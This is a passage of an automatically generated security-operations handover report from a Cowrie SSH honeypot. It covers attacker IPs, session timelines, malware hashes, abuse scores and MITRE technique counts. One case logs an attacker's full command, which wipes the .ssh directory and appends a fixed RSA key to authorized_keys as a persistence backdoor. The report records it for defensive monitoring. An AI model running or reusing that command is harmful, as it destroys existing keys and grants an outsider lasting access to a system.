| `2026-04-21 19:13:48` | `cowrie.client.version` |
| `2026-04-21 19:13:48` | `cowrie.client.kex` |
| `2026-04-21 19:13:48` | `cowrie.login.success` |
| `2026-04-21 19:13:48` | `cowrie.session.params` |
| `2026-04-21 19:13:48` | `cowrie.command.input` |
| `2026-04-21 19:13:48` | `cowrie.command.failed` |
| `2026-04-21 19:13:48` | `cowrie.log.closed` |
| `2026-04-21 19:13:48` | `cowrie.session.params` |
| `2026-04-21 19:13:48` | `cowrie.command.input` |
| `2026-04-21 19:13:48` | `cowrie.session.file_download` |
| `2026-04-21 19:13:48` | `cowrie.log.closed` |
| `2026-04-21 19:13:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.141[.]61` to AbuseIPDB if not already reported
- [ ] Block `4.247.141[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df8249e62440

| Field | Detail |
|---|---|
| **Source IP** | `4.247.141[.]61` |
| **First Seen** | 2026-04-21 19:13 |
| **Last Seen** | 2026-04-21 19:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:13:49` | `cowrie.session.connect` |
| `2026-04-21 19:13:49` | `cowrie.client.version` |
| `2026-04-21 19:13:49` | `cowrie.client.kex` |
| `2026-04-21 19:13:49` | `cowrie.login.success` |
| `2026-04-21 19:13:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.141[.]61` to AbuseIPDB if not already reported
- [ ] Block `4.247.141[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b22589d0b44c

| Field | Detail |
|---|---|
| **Source IP** | `4.247.141[.]61` |
| **First Seen** | 2026-04-21 19:16 |
| **Last Seen** | 2026-04-21 19:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:16:44` | `cowrie.session.connect` |
| `2026-04-21 19:16:44` | `cowrie.client.version` |
| `2026-04-21 19:16:44` | `cowrie.client.kex` |
| `2026-04-21 19:16:44` | `cowrie.login.success` |
| `2026-04-21 19:16:44` | `cowrie.session.params` |
| `2026-04-21 19:16:44` | `cowrie.command.input` |
| `2026-04-21 19:16:44` | `cowrie.command.failed` |
| `2026-04-21 19:16:44` | `cowrie.log.closed` |
| `2026-04-21 19:16:44` | `cowrie.session.params` |
| `2026-04-21 19:16:44` | `cowrie.command.input` |
| `2026-04-21 19:16:44` | `cowrie.session.file_download` |
| `2026-04-21 19:16:44` | `cowrie.log.closed` |
| `2026-04-21 19:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.141[.]61` to AbuseIPDB if not already reported
- [ ] Block `4.247.141[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bbde80e604a

| Field | Detail |
|---|---|
| **Source IP** | `4.247.141[.]61` |
| **First Seen** | 2026-04-21 19:16 |
| **Last Seen** | 2026-04-21 19:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 19:16:45` | `cowrie.session.connect` |
| `2026-04-21 19:16:45` | `cowrie.client.version` |
| `2026-04-21 19:16:45` | `cowrie.client.kex` |
| `2026-04-21 19:16:45` | `cowrie.login.success` |
| `2026-04-21 19:16:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.247.141[.]61` to AbuseIPDB if not already reported
- [ ] Block `4.247.141[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `77.87.40[.]114` | **26** | 2026-04-21 18:47 | 2026-04-21 19:13 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `4.247.141[.]61` | **19** | 2026-04-21 18:52 | 2026-04-21 19:17 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `204.76.203[.]224` | **2** | 2026-04-21 18:22 | 2026-04-21 18:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `204.76.203[.]73` | **2** | 2026-04-21 18:22 | 2026-04-21 18:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.210.98[.]130` | **2** | 2026-04-21 18:41 | 2026-04-21 18:43 | 4m | 0 | `T1592` | 🟢 LOW |
| `90.224.175[.]26` | **2** | 2026-04-21 18:13 | 2026-04-21 18:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.156.14[.]80` | **2** | 2026-04-21 18:18 | 2026-04-21 18:48 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `112.214.17[.]61` | 1 | 2026-04-21 17:49 | 2026-04-21 17:49 | 13s | 0 | `T1592` | 🟢 LOW |
| `191.101.59[.]254` | 1 | 2026-04-21 17:52 | 2026-04-21 17:52 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.0.63[.]25` | 1 | 2026-04-21 17:42 | 2026-04-21 17:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `69.5.0[.]120` | 1 | 2026-04-21 17:58 | 2026-04-21 17:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 10/100 | 🟢 LOW | **27/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `204.76.203[.]224` | NL | Intelligence Hosting LLC | **100** ⚠️ | 1 |
| `90.224.175[.]26` | SE | Telia Network Services | **100** ⚠️ | 4 |
| `94.156.14[.]80` | RO | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 7 |
| `191.101.59[.]254` | GB | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 8 |
| `112.214.17[.]61` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 24 |
| `4.247.141[.]61` | IN | Microsoft Corporation | **100** ⚠️ | 14 |
| `204.76.203[.]73` | NL | Intelligence Hosting LLC | **100** ⚠️ | 50 |
| `77.87.40[.]114` | UA | Znet | **100** ⚠️ | 50 |
| `69.5.0[.]120` | ID | BYTEPLUS | **100** ⚠️ | 50 |
| `218.0.63[.]25` | CN | CHINANET Zhejiang province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 104 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 53 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 44 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 23 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 23 |

---

## 🔕 False Positive Summary (34 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 12 |
| AbuseIPDB score 3 below threshold 25 | 14 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 137 cases |
| Tool 34  | Credential Extractor        | ✅ 97 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 34 filtered (24.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 17 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 44 priority case(s) shown individually · 11 recon entry/entries in table (7 group(s) consolidating 55 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-21T19:19:26Z_
